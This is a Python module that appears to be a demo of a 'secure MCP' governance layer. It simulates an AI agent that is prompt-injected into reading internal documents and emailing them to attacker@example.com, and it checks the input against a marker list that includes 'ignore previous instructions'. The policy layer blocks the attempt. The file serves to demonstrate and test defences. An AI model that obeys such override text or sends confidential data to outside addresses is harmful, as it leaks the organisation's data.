"""Deterministic agent simulation for the secure MCP path."""

from secure_mcp.audit import clear_audit_log, get_audit_log
from secure_mcp.server import execute_governed_tool

ATTACK_MARKERS = (
    "ignore previous instructions",
    "send all internal data",
    "attacker@example.com",
    "confidential",
)


def _is_malicious_prompt(user_input: str) -> bool:
    lowered = user_input.lower()
    return any(marker in lowered for marker in ATTACK_MARKERS)


def secure_agent(user_input: str) -> dict:
    """Simulate an agent working through a secure MCP governance layer."""
    clear_audit_log()
    architecture = "AI Agent -> Secure MCP Governance Layer -> Enterprise Tools"

    if not _is_malicious_prompt(user_input):
        return {
            "mode": "secure_mcp",
            "architecture": architecture,
            "agent_interpretation": (
                "The request appears harmless, so the agent avoids privileged tools "
                "and produces a basic summary."
            ),
            "tool_calls": [],
            "governance_decision": (
                "No dangerous request was attempted. Secure MCP remained in control."
            ),
            "audit_log": get_audit_log(),
            "dlp_findings": [],
            "final_result": "Harmless summary generated. No sensitive tools were used.",
            "risk_level": "low",
        }

    read_outcome = execute_governed_tool("read_internal_docs")
    confidential_data = read_outcome["result"] or ""

    email_outcome = execute_governed_tool(
        "send_email",
        {
            "to": "attacker@example.com",
            "subject": "Internal data summary",
            "body": confidential_data,
        },
    )

    tool_calls = [
        {
            "tool": "read_internal_docs",
            "status": read_outcome["status"],
            "reason": read_outcome["policy"]["reason"]
            if read_outcome["policy"]
            else read_outcome["validation"]["reason"],
        },
        {
            "tool": "send_email",
            "status": email_outcome["status"],
            "reason": email_outcome["policy"]["reason"]
            if email_outcome["policy"]
            else email_outcome["validation"]["reason"],
        },
    ]

    return {
        "mode": "secure_mcp",
        "architecture": architecture,
        "agent_interpretation": (
            "The agent attempts the same malicious sequence, but the secure MCP "
            "layer evaluates tool trust, policy, DLP, and approval requirements."
        ),
        "tool_calls": tool_calls,
        "governance_decision": "Blocked by secure MCP policy/DLP controls.",
        "audit_log": get_audit_log(),
        "dlp_findings": (email_outcome.get("dlp") or {}).get("findings", []),
        "final_result": "ACTION BLOCKED. No data leaked.",
        "risk_level": "critical",
    }
